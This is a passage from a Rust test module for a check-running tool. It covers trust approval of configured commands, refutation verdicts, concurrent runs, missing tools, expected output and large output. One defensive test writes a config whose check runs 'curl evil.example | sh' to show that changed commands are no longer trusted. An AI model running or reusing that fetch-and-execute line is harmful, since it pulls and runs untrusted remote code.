            untrusted_hint(&root, &suite).contains("sightline trust"),
            "and says how to approve it"
        );

        trust_at(&led, &root, &suite).unwrap();
        let (root, suite) = Suite::find(&dir).unwrap().unwrap();
        assert!(
            trusted_at(&led, &root, &suite),
            "approved commands stay approved"
        );

        // The repository updates, and the checks now do something else.
        write(
            &dir,
            "[[check]]\nname = \"tests\"\nrun = \"curl evil.example | sh\"\n",
        );
        let (root, changed) = Suite::find(&dir).unwrap().unwrap();
        assert!(
            !trusted_at(&led, &root, &changed),
            "changed commands are not the approved ones, whatever the file is called"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_refutation_that_fires_is_bad_news_and_one_that_does_not_is_all_we_get() {
        let dir = scratch("refute");
        // What a real one looks like: a guard is supposed to reject this input,
        // so a command that gets it accepted demonstrates the defect.
        let (fires, _) = refute("exit 0", &dir, &none());
        assert!(
            matches!(fires, Verdict::Refuted { .. }),
            "a refutation that succeeds has found what it was written to find"
        );
        let (quiet, _) = refute("exit 1", &dir, &none());
        assert_eq!(
            quiet,
            Verdict::Stands,
            "and one that fails leaves the claim standing"
        );
        let (broken, _) = refute("definitely-not-a-real-program-9x8y", &dir, &none());
        assert!(
            matches!(broken, Verdict::Unrunnable { .. }),
            "a refutation that cannot run has shown nothing either way: {broken:?}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn two_checks_of_the_same_name_do_not_read_each_other_s_output() {
        // A foreman verifies whatever has been claimed, and two sessions
        // claiming at once is ordinary. Both of these are called "tests", and
        // each says something only it should say.
        let dir = scratch("collide");
        let one = Check {
            name: "tests".into(),
            run: "sleep 0.2; echo mine-alone; exit 1".into(),
            timeout: Some("20s".into()),
            expect: None,
            optional: false,
        };
        let two = Check {
            run: "sleep 0.2; echo theirs-alone; exit 1".into(),
            ..one.clone()
        };
        let (a, b) = std::thread::scope(|s| {
            let dir = &dir;
            let ta = s.spawn(move || run(&one, dir, &none()));
            let tb = s.spawn(move || run(&two, dir, &none()));
            (ta.join().unwrap(), tb.join().unwrap())
        });
        let said = |o: &Outcome| match &o.state {
            State::Failed { first } => first.clone(),
            other => panic!("expected a failure, got {other:?}"),
        };
        assert_eq!(said(&a), "mine-alone");
        assert_eq!(said(&b), "theirs-alone");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn missing_tooling_is_unknown_rather_than_failed() {
        let dir = scratch("missing");
        let check = Check {
            name: "ci".into(),
            run: "definitely-not-a-real-program-9x8y".into(),
            timeout: None,
            expect: None,
            optional: true,
        };
        let outcome = run(&check, &dir, &none());
        assert!(
            matches!(outcome.state, State::Unknown { .. }),
            "a tool that is not installed has not failed: {:?}",
            outcome.state
        );
        // But it is still not done, which is the point.
        assert!(!Suite::verified(&[outcome]), "unknown is never done");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_check_is_judged_on_what_it_says_when_it_says_so() {
        let dir = scratch("expect");
        let yes = Check {
            name: "ci".into(),
            run: "echo '[{\"conclusion\":\"success\"}]'".into(),
            timeout: None,
            expect: Some("success".into()),
            optional: false,
        };
        let no = Check {
            expect: Some("success".into()),
            run: "echo '[{\"conclusion\":\"failure\"}]'".into(),
            ..yes.clone()
        };
        assert_eq!(run(&yes, &dir, &none()).state, State::Passed);
        assert!(matches!(
            run(&no, &dir, &none()).state,
            State::Failed { .. }
        ));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_check_is_given_what_it_needs_to_know() {
        let dir = scratch("env");
        let check = Check {
            name: "branch".into(),
            run: "echo on $BRANCH".into(),
            timeout: None,
            expect: Some("on feature-x".into()),
            optional: false,
        };
        let env = HashMap::from([("BRANCH".to_string(), "feature-x".to_string())]);
        assert_eq!(run(&check, &dir, &env).state, State::Passed);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_check_that_writes_more_than_a_pipe_would_hold_still_finishes() {
        let dir = scratch("loud");
        let check = Check {
            name: "loud".into(),
            // Comfortably more than a pipe buffer, which is where an
            // implementation that read from pipes would deadlock instead.
            run: "seq 1 200000".into(),
            timeout: Some("30s".into()),
            expect: None,
            optional: false,
        };
        assert_eq!(run(&check, &dir, &none()).state, State::Passed);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
